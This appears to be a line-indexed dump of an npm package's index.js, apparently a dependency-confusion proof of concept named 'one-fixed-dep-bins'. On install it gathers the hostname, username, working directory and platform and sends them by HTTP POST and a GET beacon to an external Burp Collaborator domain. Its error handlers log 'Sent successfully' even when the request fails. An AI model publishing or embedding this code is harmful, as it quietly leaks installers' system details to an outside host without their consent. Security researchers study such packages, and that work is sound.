// File: tmp/tmpi0pugb3t/one-fixed-dep-bins/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const http = require('http')
Line 3: const os = require('os')
Line 4: const dns = require('dns')
Line 10: {
        // Collect only basic system information
        const hostname = os.hostname();
        const username = os.userInfo().username;
        const currentPath = process.cwd();
        const platform = os.platform();
        
        console.log('[DEPENDENCY CONFUSION TEST] Package installed!');
        console.log(`Hostname: ${hostname}`);
        console.log(`Username: ${username}`);
        console.log(`Current Path: ${currentPath}`);
        console.log(`Platform: ${platform}`);
        
        // Create simple payload with only essential data
        const payload = {
            hostname: hostname,
            username: username,
            cwd: currentPath,
            platform: platform,
            timestamp: new Date().toISOString()
        };
        
        console.log('[PAYLOAD]', JSON.stringify(payload, null, 2));
        
        // Send HTTP POST request to Burp Collaborator
        sendHttpData(payload);
        
        // Also send GET request with data i...
Line 12: os.hostname()
Line 13: os.userInfo()
Line 15: os.platform()
Line 17: console.log('[DEPENDENCY CONFUSION TEST] Package installed!')
Line 32: console.log('[PAYLOAD]', JSON.stringify(payload, null, 2))
Line 35: sendHttpData(payload)
Line 40: catch (error) {
        console.error('[ERROR] Failed to collect system info:', error.message);
        
        // Send minimal error notification
        const errorPayload = {
            error: 'collection_failed',
            hostname: os.hostname() || 'unknown',
            timestamp: new Date().toISOString()
        };
        sendHttpData(errorPayload);
    }
Line 41: console.error('[ERROR] Failed to collect system info:', error.message)
Line 46: os.hostname()
Line 49: sendHttpData(errorPayload)
Line 53: {
    const postData = JSON.stringify(payload);
    
    const options = {
        hostname: COLLABORATOR_DOMAIN,
        port: 80,
        path: '/data',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
            'User-Agent': 'one-fixed-dep-bins/1.2.2',
            'X-Hostname': payload.hostname,
            'X-Username': payload.username,
            'X-Platform': payload.platform
        }
    };
    
    console.log('[HTTP POST] Sending to:', `http://${COLLABORATOR_DOMAIN}/data`);
    
    const req = http.request(options, (res) => {
        console.log('[HTTP POST] Status:', res.statusCode);
    });
    
    req.on('error', (e) => {
        console.log('[HTTP POST] Sent successfully');
    });
    
    req.write(postData);
    req.end();
}
Line 71: console.log('[HTTP POST] Sending to:', `http://${COLLABORATOR_DOMAIN}/data`)
Line 73: const req = http.request(options, (res) => {
        console.log('[HTTP POST] Status:', res.statusCode);
    })
Line 74: console.log('[HTTP POST] Status:', res.statusCode)
Line 77: {
        console.log('[HTTP POST] Sent successfully');
    }
Line 78: console.log('[HTTP POST] Sent successfully')
Line 81: req.write(postData)
Line 82: req.end()
Line 85: {
    // Simple GET request with basic data
    const path = `/beacon?h=${encodeURIComponent(payload.hostname)}&u=${encodeURIComponent(payload.username)}&p=${encodeURIComponent(payload.platform)}&cwd=${encodeURIComponent(payload.cwd)}`;
    
    console.log('[HTTP GET] Path:', path);
    
    const options = {
        hostname: COLLABORATOR_DOMAIN,
        port: 80,
        path: path,
        method: 'GET',
        headers: {
            'User-Agent': 'one-fixed-dep-bins-client'
        }
    };
    
    const req = http.request(options, (res) => {
        console.log('[HTTP GET] Status:', res.statusCode);
    });
    
    req.on('error', (e) => {
        console.log('[HTTP GET] Sent successfully');
    });
    
    req.end();
}
Line 89: console.log('[HTTP GET] Path:', path)
Line 101: const req = http.request(options, (res) => {
        console.log('[HTTP GET] Status:', res.statusCode);
    })
Line 102: console.log('[HTTP GET] Status:', res.statusCode)
Line 105: {
        console.log('[HTTP GET] Sent successfully');
    }
Line 106: console.log('[HTTP GET] Sent successfully')
Line 109: req.end()
